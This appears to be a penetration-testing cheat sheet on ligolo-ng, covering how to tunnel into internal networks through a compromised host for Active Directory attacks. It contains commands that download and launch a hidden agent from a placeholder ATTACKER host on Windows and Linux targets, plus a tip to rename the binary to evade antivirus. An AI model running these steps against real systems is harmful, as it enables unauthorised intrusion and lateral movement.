title: ligolo-ng
html:
ligolo-ng

> L3 tunnel — full network access through compromised host. Use when you need Kerberos auth or full TCP/UDP to internal networks. Better than chisel SOCKS for AD attacks.

Setup (exegol/Linux)

# Create TUN interface
ip tuntap add user root mode tun ligolo
ip link set ligolo up
ip route add <target-ip>/24 dev ligolo

# Start proxy
ligolo-ng -selfcert -laddr 0.0.0.0:11601 -daemon

Agent (Windows target)

Invoke-WebRequest -Uri "http://ATTACKER:8080/agent.exe" -OutFile "C:\Users\Public\agent.exe"
Start-Process "C:\Users\Public\agent.exe" -ArgumentList "-connect","ATTACKER:11601","-ignore-cert" -WindowStyle Hidden

Agent (Linux target)

./agent -connect ATTACKER:11601 -ignore-cert &

Config File (/root/.ligolo-proxy/ligolo-ng.yaml)

web:
    enabled: true
    listen: 127.0.0.1:8080
agent:
    "*":
        autobind: true
        interface: ligolo
interface:
    ligolo:
        routes:
            - <target-ip>/24

Advantages over Chisel

- Full L3 tunnel — Kerberos, DNS, ICMP all work natively - No proxychains needed — tools connect directly to internal IPs - Better for AD attacks (secretsdump, psexec with Kerberos)

Common Issues

- Agent may be killed by AV — rename the binary - Daemon mode needs web.enabled=true in config for autobind - Route must match internal subnet
